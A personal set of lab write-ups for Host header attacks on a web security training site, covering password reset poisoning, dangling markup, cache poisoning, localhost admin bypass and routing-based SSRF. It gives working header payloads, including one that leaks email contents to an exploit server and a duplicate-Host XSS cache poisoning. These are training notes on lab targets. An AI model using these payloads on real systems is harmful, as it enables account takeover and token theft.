# Password reset poisoning
1. This lab has a Host header attack where the header is trusted by default and is used to generate the password reset link. As a result, submitting a `Forgot my password` form with the username `carlos` and changing the Host header to be the exploit server results in the victim's link not working, and instead leaking their token when it is clicked. This token can be retrieved from the exploit server log and used to change their password.
2. This lab was already completed
3. This lab has a host header attack due to it allowing non-numeric ports and reflecting that within the link in the password reset email. As such, sending a password reset request with the following header results in a dangling markup attack: `Host: ac531f1e1f0d0555c02c253500a4008a.web-security-academy.net:'<a href="//exploit-ac6f1f791fe805c0c0a2253401b1002d.web-security-academy.net/?`. When this link is scanned by the antivirus, the contents of the email will be sent to the exploit server, including the temporary email set to the account.

# Web cache poisoning
1. This lab has a host header attack where the Host header needs to be valid for routing to the server, but there is a discrepancy in behavior if a duplicate `Host` header is provided. The routing server ignores it, while the application server uses it for generating absolute links to a javascript file. As such, you can poison the cache with a XSS vulnerability by first setting the exploit server to `/resources/js/tracking.js` with the content `alert(document.cookie)`, and then sending a request with the following headers:
```
Host: ac231fdd1ee3d328c01524a9005c00a3.web-security-academy.net
Host: exploit-acab1f2d1e08d3b7c05824f701e50002.web-security-academy.net
```

# Restricted functionality
1. This lab has a hidden `/admin` endpoint that is only accessible to users on `localhost`. This is verified using the `Host` header, and as such can be bypassed. To solve this lab, navigate to `/admin/delete?username=carlos` and override the `Host` header to be as follows: `Host: localhost`

# Routing-based SSRF
1. This lab has a load balancer that can be used to send data to arbitrary addresses. As such, we can use it to brute force the local IP address space in order to find hidden internal servers (this was done with `ip_bruteforce.py`). It found that there was an internal server at `192.168.0.205`, which redirects to a `/admin` page. By navigating there in a browser and ensuring to override the `Host` header to `Host: 192.168.0.205` at every step, you can delete arbitrary users and solve the lab
2. This lab is the same as the previous, but the `Host` header is validated. However, that validation is skipped if an absolute url is provided in the first line of the GET request (as opposed to the relative url that is typically provided). From there the lab is the same as the above one. I do not know of a way to send an absolute url in a python request and Burp Intruder is very heavily rate limited when using the Community edition. As such, I decided to skip actually performing this brute force and solving the lab as the post-bruteforce solution is identical to the above lab
